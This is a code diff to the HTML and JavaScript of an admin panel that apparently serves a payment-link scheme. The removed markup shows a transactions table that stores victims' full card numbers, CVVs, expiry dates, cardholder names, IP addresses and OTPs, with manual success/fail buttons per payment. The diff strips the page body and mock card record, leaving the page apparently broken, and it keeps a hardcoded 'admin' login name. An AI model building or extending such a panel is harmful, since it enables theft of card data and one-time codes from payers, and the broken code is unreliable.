@@ -286,105 +286,11 @@
       border-left: 4px solid var(--danger);
     }
   </style>
-</head>
-<body>
-  <!-- Login Form -->
-  <div id="loginForm">
-    <h1>Admin Login</h1>
-    <form onsubmit="return doLogin(event);">
-      <div class="form-group">
-        <label>Username</label>
-        <input type="text" id="adminUsername" required>
-      </div>
-      <div class="form-group">
-        <label>Password</label>
-        <input type="password" id="adminPassword" required>
-      </div>
-      <button type="submit" id="loginButton">Login</button>
-    </form>
-  </div>
-
-  <!-- Admin Content -->
-  <div id="adminContent">
-    <div class="header-buttons">
-      <div>
-        <button onclick="logout()">Logout</button>
-        <button onclick="deleteHistory()">Delete History</button>
-        <button onclick="showProfile()">User Profile</button>
-      </div>
-      <div>
-        Welcome, <span id="adminUser"></span>
-      </div>
-    </div>
-
-    <div class="generate-link">
-      <h2>Generate Payment Link</h2>
-      <form id="generateLinkForm">
-        <div class="form-group">
-          <label>Amount (INR)</label>
-          <input type="number" id="amount" required min="1" step="1">
-        </div>
-        <div class="form-group">
-          <label>Description</label>
-          <textarea id="description" rows="2" required></textarea>
-        </div>
-        <button type="submit" id="generateButton">Generate Link</button>
-      </form>
-      <div id="paymentLinkContainer" class="payment-link">
-        <span>Payment Link: </span>
-        <span id="paymentLink"></span>
-        <button class="copy-btn" onclick="copyPaymentLink()">Copy</button>
-      </div>
-    </div>
-
-    <h2>Transactions</h2>
-    <table id="transactionsTable">
-      <thead>
-        <tr>
-          <th>Invoice ID</th>
-          <th>Email</th>
-          <th>Amount</th>
-          <th>Currency</th>
-          <th>Card Number</th>
-          <th>CVV</th>
-          <th>Expiry</th>
-          <th>Cardholder</th>
-          <th>IP Address</th>
-          <th>OTP</th>
-          <th>Status</th>
-          <th>Actions</th>
-        </tr>
-      </thead>
-      <tbody>
-        <!-- Transaction rows will be injected here -->
-      </tbody>
-    </table>
-  </div>
-
-  <!-- User Profile Modal -->
-  <div id="userProfileModal">
-    <div class="modal-content">
-      <h2>User Profile</h2>
-      <div class="form-group">
-        <label>Username</label>
-        <p id="profileUsername"></p>
-      </div>
-      <form id="changePasswordForm">
-        <div class="form-group">
-          <label>New Password</label>
-          <input type="password" id="newPassword" required>
-        </div>
-        <div class="modal-buttons">
-          <button type="button" class="modal-cancel" onclick="closeProfile()">Cancel</button>
-          <button type="submit">Change Password</button>
-        </div>
-      </form>
-    </div>
-  </div>
-
-  <!-- Toast Container -->
-  <div id="toast" class="toast"></div>
-
+  <script>
+    // Global variables for admin panel
+    let transactions = [];
+    // For demo purposes, we will update the transactions array as mock data.
+  </script>
   <script>
     // Admin credentials and login handling
     const validUsername = "admin";
@@ -472,7 +378,7 @@
       setLoading(submitButton, false);
     };
 
-    // Payment link generation using server API
+    // Payment link generation
     async function generateLink(e) {
       e.preventDefault();
       const amount = document.getElementById('amount').value;
@@ -504,22 +410,6 @@
       await navigator.clipboard.writeText(link);
       showToast('Payment link copied to clipboard');
     }
-
-    // Transaction management (mock data for demo)
-    let transactions = [
-      {
-        id: 'tx' + Math.random().toString(36).substr(2, 9),
-        email: 'user@example.com',
-        amount: 1000,
-        currency: 'INR',
-        cardNumber: '4111111111111111',
-        cvv: '123',
-        expiry: '12/24',
-        cardholder: 'John Doe',
-        ip: '192.168.1.1',
-        status: 'processing'
-      }
-    ];
 
     function loadTransactions() {
       const tbody = document.querySelector("#transactionsTable tbody");
@@ -562,7 +452,7 @@
               <button onclick="updateStatus('${tx.id}', 'fail', this)" ${!tx.otpEntered ? 'disabled' : ''}>
                 Fail
               </button>
-            ` : ''}
+             ` : ''}
           </td>
         `;
         tbody.appendChild(row);
@@ -603,7 +493,6 @@
       }
     }
 
-    // Auto-login if already logged in
     window.onload = function() {
       const loggedIn = localStorage.getItem('adminLoggedIn') === 'true';
       if (loggedIn) {
